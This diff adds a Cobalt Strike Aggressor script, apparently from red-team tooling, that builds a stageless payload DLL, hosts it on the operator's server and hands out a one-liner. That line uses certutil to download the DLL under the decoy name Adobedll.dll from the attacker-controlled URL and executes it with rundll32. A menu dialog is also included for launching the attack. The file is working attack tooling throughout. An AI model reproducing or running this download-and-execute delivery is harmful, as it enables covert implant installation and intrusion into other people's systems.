@@ -1,0 +1,60 @@
+# CertUtil Scripted Web Delivery (Stageless)
+# Author: @r3dQu1nn
+# This script is based off the Scripted Web Delivery created by @armitagehacker, <3 raffi!
+# https://gist.github.com/rsmudge/629bd4ddce3bbbca1f8c16378a6a419c
+# Please be aware of the default values used in the script
+# Thanks to @carnal0wnage and @subTee for the discovery of this type of attack
+# https://twitter.com/subTee/status/888071631528235010
+# http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html
+
+# setup our stageless PowerShell Web Delivery attack
+sub stage_attack {
+	local('%options $script $url $arch');
+	%options = $3;
+
+	# get the arch right.
+	$arch = iff(%options["x64"] eq "true", "x64", "x86");
+
+	# generate our stageless PowerShell script. We're going to make *this* function
+	# the callback for this call. That's why we yield after.
+	artifact_stageless(%options["listener"], "dll", $arch, $null, $this);
+	yield;
+
+	# this function is now resumed after &artifact_stageless finished. $1 is our script.
+	$script = $1;
+
+	# host the script
+	$url = site_host(%options["host"], %options["port"], %options["uri"], $script, "automatic", "Scripted Web Delivery (CertUtil)"); 
+
+	# tell the user our URL
+	prompt_text("Copy/Paste One-liner: ", "powershell certutil.exe -urlcache -split -f " . $url . " Adobedll.dll; rundll32.exe Adobedll.dll,StartW", {});
+	show_message("Be aware of the default values in this script and change them! (Adobedll.dll, dll.txt)");
+	elog("powershell certutil.exe -urlcache -split -f " . $url . " Adobedll.dll; rundll32.exe Adobedll.dll,StartW");
+
+}
+
+# create a popup menu
+popup attacks {
+	item "CertUtil Web Delivery (S)" {
+		local('$dialog %defaults');
+
+		# setup our defaults
+		%defaults["uri"]  = "/dll.txt";
+		%defaults["host"] = localip();
+		%defaults["port"] = 80;
+
+		# create our dialog
+		$dialog = dialog("CertUtil Web Delivery (Stageless)", %defaults, &stage_attack);
+		dialog_description($dialog, "A stageless version of the CertUtil Web Delivery attack.");
+		drow_text($dialog, "uri", "URI Path: ", 20);
+		drow_text($dialog, "host", "Local Host: ");
+		drow_text($dialog, "port", "Local Port: ");
+		drow_listener_stage($dialog, "listener", "Listener: ");
+		drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
+		dbutton_action($dialog, "Launch");
+
+		# show our dialog
+		dialog_show($dialog);
+	}
+}
+
